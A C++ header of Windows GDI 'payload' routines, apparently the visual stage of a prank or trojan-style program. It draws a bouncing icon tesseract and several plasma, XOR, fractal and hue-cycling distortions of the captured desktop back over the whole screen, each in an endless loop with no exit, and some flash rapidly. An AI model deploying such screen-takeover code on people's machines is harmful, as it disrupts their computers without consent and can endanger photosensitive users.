#pragma once
// special GDI Payload
struct VERTEX { float x, y, z; };
struct EDGE { int v0, v1; };

namespace _3D
{
    // Correct rotation using temporary variables
    void RotateX(VERTEX& v, float angle)
    {
        float y = v.y, z = v.z;
        v.y = y * cos(angle) - z * sin(angle);
        v.z = y * sin(angle) + z * cos(angle);
    }
    void RotateY(VERTEX& v, float angle)
    {
        float x = v.x, z = v.z;
        v.x = x * cos(angle) + z * sin(angle);
        v.z = -x * sin(angle) + z * cos(angle);
    }
    void RotateZ(VERTEX& v, float angle)
    {
        float x = v.x, y = v.y;
        v.x = x * cos(angle) - y * sin(angle);
        v.y = x * sin(angle) + y * cos(angle);
    }

    // Draw an edge using HICON instead of LPCWSTR
    void DrawEdge(HDC dc, HICON hIcon, int x0, int y0, int x1, int y1, int step = 10)
    {
        int dx = abs(x1 - x0);
        int dy = -abs(y1 - y0);
        int sx = (x0 < x1) ? 1 : -1;
        int sy = (y0 < y1) ? 1 : -1;
        int err = dx + dy;
        int i = 0;

        while (true)
        {
            if (i == 0)
            {
                DrawIcon(dc, x0, y0, hIcon);
                i = step;
            }
            else i--;

            if (x0 == x1 && y0 == y1) break;

            int e2 = 2 * err;
            if (e2 >= dy) { err += dy; x0 += sx; }
            if (e2 <= dx) { err += dx; y0 += sy; }
        }
    }
}
DWORD WINAPI BGDI(LPVOID lpParam)
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    float size = (w + h) / 10.0f;
    float cx = size, cy = size;
    float velX = 15, velY = 15;

    float angleX = 0.02f, angleY = 0.02f, angleZ = 0.02f;

    // Load multiple icons
    HICON icons[] = {
    LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)),
    LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON3)),
    LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON4)),
    LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON5))
    };
    int iconIndex = rand() % 4;

    // Cube/tesseract vertices
    const int d = 60;
    VERTEX vtx[] = {
        {size,0,0},{size,size,0},{0,size,0},{0,0,0},
        {size,0,size},{size,size,size},{0,size,size},{0,0,size},
        {size - d,d,d},{size - d,size - d,d},{d,size - d,d},{d,d,d},
        {size - d,d,size - d},{size - d,size - d,size - d},{d,size - d,size - d},{d,d,size - d}
    };

    EDGE edges[] = {
        {0,1},{1,2},{2,3},{3,0},{0,4},{1,5},{2,6},{3,7},
        {4,5},{5,6},{6,7},{7,4},
        {8,9},{9,10},{10,11},{11,8},
        {8,12},{9,13},{10,14},{11,15},
        {12,13},{13,14},{14,15},{15,12},
        {0,8},{1,9},{2,10},{3,11},{4,12},{5,13},{6,14},{7,15}
    };

    int totV = sizeof(vtx) / sizeof(vtx[0]);
    int totE = sizeof(edges) / sizeof(edges[0]);

    HDC dc;

    while (true)
    {
        dc = GetDC(NULL);

        // Rotate all vertices
        for (int i = 0; i < totV; i++)
        {
            _3D::RotateX(vtx[i], angleX);
            _3D::RotateY(vtx[i], angleY);
            _3D::RotateZ(vtx[i], angleZ);
        }

        // Draw edges
        for (int i = 0; i < totE; i++)
        {
            auto& e = edges[i];
            _3D::DrawEdge(dc, icons[iconIndex],
                (int)(vtx[e.v0].x + cx),
                (int)(vtx[e.v0].y + cy),
                (int)(vtx[e.v1].x + cx),
                (int)(vtx[e.v1].y + cy));
        }

        ReleaseDC(0, dc);
        Sleep(30);

        // Move and bounce
        cx += velX;
        cy += velY;

        if (cx > w - size / 2 || cx < -size / 2) { velX *= -1; iconIndex = rand() % 4; }
        if (cy > h - size / 2 || cy < -size / 2) { velY *= -1; iconIndex = rand() % 4; }
    }

    return 0;
}
//gdi payload head
namespace p1 {
    typedef struct _TRGBQUAD
    {
        BYTE rgbBlue;
        BYTE rgbGreen;
        BYTE rgbRed;
        BYTE rgbReserved;
    } TRGBQUAD;
	DWORD WINAPI GDI(LPVOID lpParam)
	{
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmi = {};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;     // top-down DIB
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* px = nullptr;

        HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&px, NULL, 0);
        SelectObject(dcCopy, bmp);

        double angle = 0.0;
        int t = 0;

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int id = y * ws + x;

                    // centered coordinates
                    float cx = float(x - ws / 2);
                    float cy = float(y - hs / 2);

                    // rotation
                    float rx = cx * cos(angle) - cy * sin(angle);
                    float ry = cx * sin(angle) + cy * cos(angle);

                    // plasma formula
                    float v =
                        sin(rx * 0.03f + angle) +
                        sin(ry * 0.03f + angle * 1.3f) +
                        sin((rx + ry) * 0.02f + angle * 0.7f);

                    v = (v + 3.0f) * 42.0f;   // normalize & amplify

                    BYTE r = BYTE((sin(v * 0.05f + angle) * 127 + 128));
                    BYTE g = BYTE((sin(v * 0.06f + angle * 1.2f) * 127 + 128));
                    BYTE b = BYTE((sin(v * 0.07f + angle * 1.7f) * 127 + 128));

                    px[id].rgbRed += r;
                    px[id].rgbGreen += g;
                    px[id].rgbBlue += b;
                    px[id].rgbReserved = 0;
                }
            }

            angle += 0.03;
            t++;

            // upscale to full screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(1);
        }

        return 0;
	}
}
namespace p2 {
    typedef struct TRGBQUAD {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE a;
    } TRGBQUAD;

	DWORD WINAPI GDI(LPVOID lpParam)
	{
        // Screen DC
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        // Screen size
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        // Downsampled texture buffer
        int ws = w / 4;
        int hs = h / 4;

        // DIB Section info
        BITMAPINFO bmi = {};
        bmi.bmiHeader.biSize = sizeof(bmi);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;     // top-down DIB (faster)
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* buffer = nullptr;

        // Create DIB section
        HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&buffer, NULL, 0);
        SelectObject(dcCopy, bmp);

        double angle = 0.0;
        int phase = 0;

        // --------------------------------------------------------
        // MAIN LOOP
        // --------------------------------------------------------
        while (true)
        {
            // Copy screen into smaller buffer
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            double s = sin(angle);
            double c = cos(angle);

            // --------------------------------------------------------
            // Pixel Shader Loop — XOR ZoomLineRotate
            // --------------------------------------------------------
            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int idx = y * ws + x;

                    int cx = x - (ws >> 1);
                    int cy = y - (hs >> 1);

                    int rx = int(c * cx - s * cy);
                    int ry = int(s * cx + c * cy);

                    int fx = (rx ^ ry ^ phase) & 0xFF;   // XOR distortion

                    buffer[idx].r += fx;
                    buffer[idx].g += fx * 2;
                    buffer[idx].b += fx * 3;
                }
            }

            phase += 2;
            angle += 0.015;

            // Stretch effect to full screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(1);
        }

        return 0;
	}
}
namespace p3 {
    typedef struct _TRGBQUAD {
        BYTE b, g, r, a;
    } TRGBQUAD;
	DWORD WINAPI GDI(LPVOID lpParam)
	{
        // Screen DCs
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        // Screen size
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int ws = w / 3;   // Smaller buffer = faster
        int hs = h / 3;

        // ---- Setup DIB ----
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;       // Top-down for natural indexing
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* pixels = nullptr;

        HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS,
            (void**)&pixels, NULL, 0);
        SelectObject(dcCopy, bmp);

        // ---- Animation Vars ----
        double ang = 0.0;
        int tick = 0;

        // ---- Main Loop ----
        for (;;)
        {
            // Capture screen → reduced buffer
            StretchBlt(dcCopy, 0, 0, ws, hs,
                dc, 0, 0, w, h, SRCCOPY);

            // ---- Mandelbrot Rotate Shader ----
            for (int y = 0; y < hs; y++)
            {
                TRGBQUAD* row = pixels + (y * ws);

                for (int x = 0; x < ws; x++)
                {
                    // Normalize to center
                    double nx = (x - ws * 0.5) / (ws * 0.5);
                    double ny = (y - hs * 0.5) / (hs * 0.5);

                    // Rotate coordinates
                    double rx = nx * cos(ang) - ny * sin(ang);
                    double ry = nx * sin(ang) + ny * cos(ang);

                    // Mandelbrot-style iteration (very cheap)
                    double zx = rx;
                    double zy = ry;
                    int iter = 0;

                    for (; iter < 32; ++iter)
                    {
                        double zx2 = zx * zx - zy * zy + rx;
                        double zy2 = 2.0 * zx * zy + ry;

                        zx = zx2;
                        zy = zy2;

                        if (zx * zx + zy * zy > 4.0) break;
                    }

                    // Add effect on top of captured pixels
                    TRGBQUAD& px = row[x];

                    BYTE add = (BYTE)(iter * 8); // glow intensity

                    // clamp manually (no UB)
                    int r = px.r + add;
                    int g = px.g + add;
                    int b = px.b + add;

                    px.r += (r > 255 ? 255 : r);
                    px.g += (g > 255 ? 255 : g);
                    px.b += (b > 255 ? 255 : b);
                }
            }

            // Render buffer → screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            tick++;
            ang += 0.015;

            Sleep(1);     // requested
        }

        return 0;
	}
}
namespace p4 {
    typedef struct {
        float h, s, l;
    } HSL;

    namespace Colors {

        HSL rgb2hsl(const RGBQUAD& rgb)
        {
            float r = rgb.rgbRed / 255.f;
            float g = rgb.rgbGreen / 255.f;
            float b = rgb.rgbBlue / 255.f;

            float minv = min(r, min(g, b));
            float maxv = max(r, max(g, b));
            float delta = maxv - minv;

            HSL hsl{};
            hsl.l = (maxv + minv) * 0.5f;

            if (delta < 0.00001f) {
                hsl.h = 0.f;
                hsl.s = 0.f;
                return hsl;
            }

            hsl.s = (hsl.l <= 0.5f)
                ? (delta / (maxv + minv))
                : (delta / (2.f - maxv - minv));

            float dr = (((maxv - r) / 6.f) + (delta * 0.5f)) / delta;
            float dg = (((maxv - g) / 6.f) + (delta * 0.5f)) / delta;
            float db = (((maxv - b) / 6.f) + (delta * 0.5f)) / delta;

            if (r == maxv)      hsl.h = db - dg;
            else if (g == maxv) hsl.h = (1.f / 3.f) + dr - db;
            else                hsl.h = (2.f / 3.f) + dg - dr;

            if (hsl.h < 0.f) hsl.h += 1.f;
            if (hsl.h > 1.f) hsl.h -= 1.f;

            return hsl;
        }

        RGBQUAD hsl2rgb(const HSL& hsl)
        {
            float h = hsl.h * 6.f;
            float s = hsl.s;
            float l = hsl.l;

            RGBQUAD rgb{ 0,0,0,0 };

            float v = (l <= 0.5f) ? (l * (1.f + s)) : (l + s - l * s);
            if (v <= 0.f) return rgb;

            float m = l + l - v;
            float sv = (v - m) / v;

            int sextant = (int)h;
            float fract = h - sextant;
            float vsf = v * sv * fract;
            float mid1 = m + vsf;
            float mid2 = v - vsf;

            float r = 0, g = 0, b = 0;
            switch (sextant) {
            case 0: r = v; g = mid1; b = m; break;
            case 1: r = mid2; g = v; b = m; break;
            case 2: r = m; g = v; b = mid1; break;
            case 3: r = m; g = mid2; b = v; break;
            case 4: r = mid1; g = m; b = v; break;
            default: r = v; g = m; b = mid2; break;
            }

            rgb.rgbRed = (BYTE)(r * 255.f);
            rgb.rgbGreen = (BYTE)(g * 255.f);
            rgb.rgbBlue = (BYTE)(b * 255.f);

            return rgb;
        }
    }
	DWORD WINAPI GDI(LPVOID lpParam)
	{
        HDC hdcScreen = GetDC(NULL);
        int W = GetSystemMetrics(SM_CXSCREEN);
        int H = GetSystemMetrics(SM_CYSCREEN);

        BITMAPINFO bi = { 0 };
        bi.bmiHeader.biSize = sizeof(bi.bmiHeader);
        bi.bmiHeader.biWidth = W;
        bi.bmiHeader.biHeight = -H;     // top-down bitmap
        bi.bmiHeader.biPlanes = 1;
        bi.bmiHeader.biBitCount = 32;
        bi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* buf = nullptr;

        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmp = CreateDIBSection(hdcScreen, &bi, DIB_RGB_COLORS, (void**)&buf, NULL, 0);
        SelectObject(hdcMem, hbmp);

        int t = 0;

        for (;;) {
            BitBlt(hdcMem, 0, 0, W, H, hdcScreen, 0, 0, SRCCOPY);

            for (int y = 0; y < H; y++) {
                for (int x = 0; x < W; x++) {

                    int idx = y * W + x;

                    RGBQUAD px = buf[idx];
                    HSL hsl = Colors::rgb2hsl(px);

                    float fx = (float)(t + x * 2 + y * 3);

                    hsl.h = fmodf(fx / 500.f + hsl.h + 0.02f, 1.f);
                    hsl.s = 1.f;
                    hsl.l = 0.5f;

                    buf[idx] = Colors::hsl2rgb(hsl);
                }
            }

            BitBlt(hdcScreen, 0, 0, W, H, hdcMem, 0, 0, SRCCOPY);
            t++;
        }

        return 0;
	}
}
namespace p5 {
    typedef struct {
        float h;
        float s;
        float l;
    } HSL;

    namespace Colors {

        HSL rgb2hsl(RGBQUAD rgb) {
            HSL hsl;
            float r = rgb.rgbRed / 255.f;
            float g = rgb.rgbGreen / 255.f;
            float b = rgb.rgbBlue / 255.f;

            float maxc = max(max(r, g), b);
            float minc = min(min(r, g), b);
            float delta = maxc - minc;

            hsl.l = (maxc + minc) / 2.f;

            if (delta == 0.f) {
                hsl.h = 0.f;
                hsl.s = 0.f;
            }
            else {
                hsl.s = hsl.l < 0.5f ? delta / (maxc + minc) : delta / (2.f - maxc - minc);

                if (r == maxc) hsl.h = (g - b) / delta;
                else if (g == maxc) hsl.h = 2.f + (b - r) / delta;
                else hsl.h = 4.f + (r - g) / delta;

                hsl.h /= 6.f;
                if (hsl.h < 0.f) hsl.h += 1.f;
            }
            return hsl;
        }

        float hue2rgb(float p, float q, float t) {
            if (t < 0.f) t += 1.f;
            if (t > 1.f) t -= 1.f;
            if (t < 1.f / 6.f) return p + (q - p) * 6.f * t;
            if (t < 1.f / 2.f) return q;
            if (t < 2.f / 3.f) return p + (q - p) * (2.f / 3.f - t) * 6.f;
            return p;
        }

        RGBQUAD hsl2rgb(HSL hsl) {
            RGBQUAD rgb;
            float r, g, b;

            if (hsl.s == 0.f) {
                r = g = b = hsl.l; // grayscale
            }
            else {
                float q = hsl.l < 0.5f ? hsl.l * (1.f + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
                float p = 2.f * hsl.l - q;
                r = hue2rgb(p, q, hsl.h + 1.f / 3.f);
                g = hue2rgb(p, q, hsl.h);
                b = hue2rgb(p, q, hsl.h - 1.f / 3.f);
            }

            rgb.rgbRed = (BYTE)(r * 255.f);
            rgb.rgbGreen = (BYTE)(g * 255.f);
            rgb.rgbBlue = (BYTE)(b * 255.f);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }
	DWORD WINAPI GDI(LPVOID lpParam)
	{
        // Full screen setup
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);

        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = -h; // top-down DIB
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* pixels = nullptr;
        HBITMAP hBmp = CreateDIBSection(hdcScreen, &bmpi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(hdcMem, hBmp);

        int t = 0;

        while (true) {
            // Copy screen to memory DC
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

            for (int y = 0; y < h; ++y) {
                for (int x = 0; x < w; ++x) {
                    int idx = y * w + x;

                    RGBQUAD c = pixels[idx];
                    HSL hsl = Colors::rgb2hsl(c);

                    // Ship ruins plasma underwater effect
                    float fx = x + t * 0.5f;
                    float fy = y + t * 0.3f;
                    hsl.h = fmod(sin(fx * 0.02f) + cos(fy * 0.02f) + t * 0.005f, 1.f);

                    pixels[idx] = Colors::hsl2rgb(hsl);
                }
            }

            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            t++;
            Sleep(16); // ~60fps
        }

        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
	}
    VOID WINAPI SplitBltFast(HDC dst, HDC src, int offset, int w, int h, DWORD rop)
    {
        int hw = w >> 1; // half-width
        int hh = h >> 1; // half-height

        // quadrant blits (optimized ordering avoids read/write overlap)
        BitBlt(dst, hw + offset, 0, hw, hh, src, hw, offset, rop);
        BitBlt(dst, hw + offset, hh + offset, hw, hh, src, hw, hh, rop);
        BitBlt(dst, 0, 0, hw, hh, src, offset, offset, rop);
        BitBlt(dst, 0, hh + offset, hw, hh, src, offset, hh, rop);
    }

    DWORD WINAPI GDI2(LPVOID lpParam)
    {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC screen = GetDC(NULL);

        // create a fast compatible backbuffer
        HDC back = CreateCompatibleDC(screen);
        HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
        SelectObject(back, bmp);

        while (true)
        {
            // snapshot once → extremely faster than blitting from screen repeatedly
            BitBlt(back, 0, 0, w, h, screen, 0, 0, SRCCOPY);

            // apply your effect using fast offscreen HDC
            SplitBltFast(screen, back, 1, w, h, SRCCOPY);

            // optional throttling (keeps CPU under 3–5%)
            Sleep(1);
        }

        // unreachable in your original infinite loop, but proper cleanup:
        DeleteObject(bmp);
        DeleteDC(back);
        ReleaseDC(NULL, screen);
        return 0;
    }
}

namespace p6 {
    typedef struct _TRGBQUAD {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE a;
    } TRGBQUAD;
	DWORD WINAPI GDI(LPVOID lpParam)
	{
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 4;
        int hs = h / 4;

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;   // top-down bitmap
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* px = NULL;

        HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&px, NULL, 0);
        SelectObject(dcCopy, bmp);

        double angle = 0.0;
        int t = 0;

        while (1)
        {
            // copy scaled desktop frame to shader surface
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int idx = y * ws + x;

                    int cx = x - ws / 2;
                    int cy = y - hs / 2;

                    // rotating transform
                    float rx = (float)(cos(angle) * cx - sin(angle) * cy);
                    float ry = (float)(sin(angle) * cx + cos(angle) * cy);

                    // plasmarine warp function
                    float plasma =
                        sin(rx * 0.03f + t * 0.04f) * 128 +
                        cos(ry * 0.03f + t * 0.03f) * 128 +
                        sin((rx + ry) * 0.02f + t * 0.02f) * 128;

                    int value = (int)plasma;

                    // split-screen: left = additive, right = subtractive
                    if (x < ws / 2) {
                        px[idx].r += min(255, px[idx].r + value);
                        px[idx].g += min(255, px[idx].g + value);
                        px[idx].b += min(255, px[idx].b + value);
                    }
                    else {
                        px[idx].r -= max(0, px[idx].r - value);
                        px[idx].g -= max(0, px[idx].g - value);
                        px[idx].b -= max(0, px[idx].b - value);
                    }
                }
            }

            t++;
            angle += 0.0125;

            // render result fullscreen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(1);
        }

        return 0;
	}
}
namespace p7 {
    typedef struct _TRGBQUAD {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE a;
    } TRGBQUAD;
	DWORD WINAPI GDI(LPVOID lpParam)
	{
        srand(GetTickCount());

        HDC screen = GetDC(NULL);
        HDC memdc = CreateCompatibleDC(screen);

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;        // top-down DIB
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* px = nullptr;

        HBITMAP bmp = CreateDIBSection(screen, &bmi, DIB_RGB_COLORS, (void**)&px, NULL, 0);
        SelectObject(memdc, bmp);

        double angle = 0.0;
        int i = 0;

        while (1)
        {
            StretchBlt(memdc, 0, 0, ws, hs, screen, 0, 0, w, h, SRCCOPY);

            // Precompute sin/cos
            double s = sin(angle);
            double c = cos(angle);

            TRGBQUAD* row = px;

            for (int y = 0; y < hs; y++)
            {
                int cy = y - (hs >> 1);
                TRGBQUAD* cell = row;

                for (int x = 0; x < ws; x++)
                {
                    int cx = x - (ws >> 1);

                    // 2D rotation
                    int zx = (int)(c * cx - s * cy);
                    int zy = (int)(s * cx + c * cy);

                    // XOR red-carbon shimmer
                    int fx = (zx ^ zy) + (i & 255);

                    cell->r += (BYTE)(fx);
                    cell->g += (BYTE)(fx >> 1);
                    cell->b += (BYTE)(fx >> 2);

                    cell++;
                }
                row += ws;
            }

            i++;
            angle += 0.012;

            StretchBlt(screen, 0, 0, w, h, memdc, 0, 0, ws, hs, SRCCOPY);

            Sleep(1);
        }

        return 0;
	}
}
namespace p8 {
    typedef struct
    {
        float h;
        float s;
        float l;
    } HSL;

    namespace Colors
    {
        HSL rgb2hsl(RGBQUAD rgb)
        {
            HSL hsl;
            float r = rgb.rgbRed / 255.f;
            float g = rgb.rgbGreen / 255.f;
            float b = rgb.rgbBlue / 255.f;

            float max = fmaxf(r, fmaxf(g, b));
            float min = fminf(r, fminf(g, b));
            float delta = max - min;

            hsl.l = (max + min) / 2.f;

            if (delta == 0.f)
            {
                hsl.h = 0.f;
                hsl.s = 0.f;
            }
            else
            {
                hsl.s = (hsl.l < 0.5f) ? delta / (max + min) : delta / (2.f - max - min);

                if (max == r) hsl.h = (g - b) / delta + (g < b ? 6.f : 0.f);
                else if (max == g) hsl.h = (b - r) / delta + 2.f;
                else hsl.h = (r - g) / delta + 4.f;

                hsl.h /= 6.f;
            }

            return hsl;
        }

        RGBQUAD hsl2rgb(HSL hsl)
        {
            float r, g, b;

            if (hsl.s == 0.f)
            {
                r = g = b = hsl.l; // achromatic
            }
            else
            {
                auto hue2rgb = [](float p, float q, float t) -> float {
                    if (t < 0.f) t += 1.f;
                    if (t > 1.f) t -= 1.f;
                    if (t < 1.f / 6.f) return p + (q - p) * 6.f * t;
                    if (t < 1.f / 2.f) return q;
                    if (t < 2.f / 3.f) return p + (q - p) * (2.f / 3.f - t) * 6.f;
                    return p;
                    };

                float q = hsl.l < 0.5f ? hsl.l * (1.f + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
                float p = 2.f * hsl.l - q;
                r = hue2rgb(p, q, hsl.h + 1.f / 3.f);
                g = hue2rgb(p, q, hsl.h);
                b = hue2rgb(p, q, hsl.h - 1.f / 3.f);
            }

            RGBQUAD rgb;
            rgb.rgbRed = (BYTE)(r * 255.f);
            rgb.rgbGreen = (BYTE)(g * 255.f);
            rgb.rgbBlue = (BYTE)(b * 255.f);
            rgb.rgbReserved = 0;
            return rgb;
        }
    }
	DWORD WINAPI GDI(LPVOID lpParam)
	{
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h; // top-down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* pixels = nullptr;
        HBITMAP hBmp = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(hdcMem, hBmp);

        int frame = 0;

        while (true)
        {
            // Capture the screen
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

            for (int y = 0; y < h; y++)
            {
                for (int x = 0; x < w; x++)
                {
                    int idx = y * w + x;
                    RGBQUAD rgb = pixels[idx];

                    HSL hsl = Colors::rgb2hsl(rgb);

                    // Flashy hue animation
                    float fx = 239 + frame;
                    hsl.h = fmodf(fx / 500.f + hsl.h + 0.02f, 1.f);
                    hsl.s = 1.f;
                    hsl.l = 0.5f;

                    pixels[idx] = Colors::hsl2rgb(hsl);
                }
            }

            // Display the updated image
            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            frame++;
        }

        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
	}
}